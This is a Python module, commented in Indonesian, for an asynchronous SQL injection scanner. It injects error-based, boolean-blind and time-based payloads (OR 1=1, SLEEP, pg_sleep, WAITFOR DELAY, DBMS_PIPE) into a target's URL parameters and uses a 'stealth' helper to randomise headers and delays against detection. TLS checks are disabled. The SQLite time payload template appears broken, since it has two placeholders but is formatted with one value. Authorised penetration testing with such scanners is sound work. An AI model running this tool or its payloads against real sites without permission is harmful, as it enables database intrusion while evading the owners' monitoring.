# modules/sqli_scanner.py — error-based + boolean-blind + time-based 2 tahap (N lalu 2N)
MODULE_NAME = "sqli_scanner"

import asyncio
import random
import re
import time
from typing import Dict, Any, List
from stealth_servant import get_stealth_headers, random_delay, build_session

__all__ = ["MODULE_NAME", "scan"]

ERROR_PATTERNS = {
    "MySQL": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQL server version", r"supplied argument is not a valid MySQL"],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result", r"Npgsql\.Exception"],
    "Microsoft SQL Server": [r"Driver.*SQL.*Server", r"OLE DB.*SQL Server", r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server"],
    "Oracle": [r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_"],
    "SQLite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"sqlite3\.OperationalError"],
    "Generic": [r"syntax error", r"unexpected end of SQL command", r"unterminated quoted string"]
}

BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' AND '1'='2"),
    ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("') OR ('1'='1", "') AND ('1'='2"),
    ("\") OR (\"1\"=\"1", "\") AND (\"1\"=\"2"),
    ("1 OR 1=1", "1 AND 1=2"),
]

TIME_PAYLOADS_MYSQL = ["' OR SLEEP({})--", "\" OR SLEEP({})--", "') OR SLEEP({})--"]
TIME_PAYLOADS_POSTGRES = ["' OR pg_sleep({})--", "\" OR pg_sleep({})--"]
TIME_PAYLOADS_MSSQL = ["' WAITFOR DELAY '0:0:{}'--", "\" WAITFOR DELAY '0:0:{}'--"]
TIME_PAYLOADS_ORACLE = ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{})--"]
TIME_PAYLOADS_SQLITE = ["' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name LIKE '%') AND {}={}--"]

ALL_TIME_PAYLOADS = {
    "MySQL": TIME_PAYLOADS_MYSQL,
    "PostgreSQL": TIME_PAYLOADS_POSTGRES,
    "MSSQL": TIME_PAYLOADS_MSSQL,
    "Oracle": TIME_PAYLOADS_ORACLE,
    "SQLite": TIME_PAYLOADS_SQLITE
}


def _extract_params(url: str) -> List[Dict[str, str]]:
    """Ekstrak parameter dari URL."""
    params = []
    if "?" in url:
        query = url.split("?", 1)[1]
        for pair in query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params.append({"name": k, "value": v, "full": pair})
    return params


async def _test_payload(url: str, param: Dict, payload: str, session, method: str = "GET") -> Dict[str, Any]:
    """Test satu payload pada parameter."""
    test_value = param["value"] + payload
    test_url = url.replace(param["full"], f"{param['name']}={test_value}")

    headers = get_stealth_headers()
    start = time.time()
    try:
        await random_delay(0.2)
        async with session.get(test_url, headers=headers, timeout=15, allow_redirects=True) as resp:
            body = await resp.text(errors="ignore")
            elapsed = time.time() - start
            return {"url": test_url, "status": resp.status, "body": body, "elapsed": elapsed, "payload": payload}
    except Exception as e:
        return {"url": test_url, "error": str(e), "elapsed": time.time() - start, "payload": payload}


async def scan(target: str, config: Dict[str, Any]) -> Dict[str, Any]:
    """SQLi scanner: error-based, boolean-blind, time-based (2 tahap N lalu 2N)."""
    start = time.time()
    base_url = target if target.startswith("http") else f"https://{target}"
    params = _extract_params(base_url)

    if not params:
        base_url += "?id=1"
        params = [{"name": "id", "value": "1", "full": "id=1"}]

    async with build_session(verify=False, timeout=20) as session:
        findings = []
        baseline_resp = None
        for param in params[:3]:
            baseline_resp = await _test_payload(base_url, param, "", session)
            if "error" not in baseline_resp:
                break

        if not baseline_resp or "error" in baseline_resp:
            return {
                "module": MODULE_NAME,
                "target": target,
                "findings": [{"type": "error", "detail": "Gagal baseline request", "severity": "error"}],
                "summary": "Gagal koneksi baseline",
                "severity": "error",
                "duration": round(time.time() - start, 2)
            }

        baseline_body = baseline_resp["body"]
        baseline_len = len(baseline_body)

        for param in params[:3]:
            for db_type, patterns in ERROR_PATTERNS.items():
                for pattern in patterns:
                    payload = f"'{pattern.split('.*')[0].strip()}"
                    result = await _test_payload(base_url, param, payload, session)
                    if "error" not in result:
                        for pat in patterns:
                            if re.search(pat, result["body"], re.IGNORECASE):
                                findings.append({
                                    "parameter": param["name"],
                                    "type": "error_based",
                                    "dbms": db_type,
                                    "payload": payload,
                                    "evidence": pat,
                                    "severity": "high"
                                })
                                break

            for true_payload, false_payload in BOOLEAN_PAYLOADS:
                true_res = await _test_payload(base_url, param, true_payload, session)
                false_res = await _test_payload(base_url, param, false_payload, session)
                if "error" not in true_res and "error" not in false_res:
                    diff = abs(len(true_res["body"]) - len(false_res["body"]))
                    if diff > 200 or (true_res["status"] != false_res["status"]):
                        findings.append({
                            "parameter": param["name"],
                            "type": "boolean_blind",
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "length_diff": diff,
                            "severity": "medium"
                        })
                        break

            for db_type, payloads in ALL_TIME_PAYLOADS.items():
                for payload_template in payloads:
                    for delay in [3, 6]:
                        payload = payload_template.format(delay)
                        result = await _test_payload(base_url, param, payload, session)
                        if "error" not in result and result["elapsed"] >= delay * 0.8:
                            findings.append({
                                "parameter": param["name"],
                                "type": "time_based",
                                "dbms": db_type,
                                "payload": payload,
                                "delay": delay,
                                "actual_elapsed": round(result["elapsed"], 2),
                                "severity": "high"
                            })
                            break
                    else:
                        continue
                    break

    duration = time.time() - start
    return {
        "module": MODULE_NAME,
        "target": target,
        "findings": findings,
        "summary": f"{len(findings)} potential SQLi ditemukan pada {len(params)} parameter",
        "severity": "high" if any(f["severity"] == "high" for f in findings) else ("medium" if any(f["severity"] == "medium" for f in findings) else "info"),
        "duration": round(duration, 2),
        "tested_params": len(params),
        "baseline_length": baseline_len
    }


if __name__ == "__main__":
    import sys
    import json
    t = sys.argv[1] if len(sys.argv) > 1 else "https://testphp.vulnweb.com/artists.php?artist=1"
    print(json.dumps(asyncio.run(scan(t, {})), indent=2, ensure_ascii=False))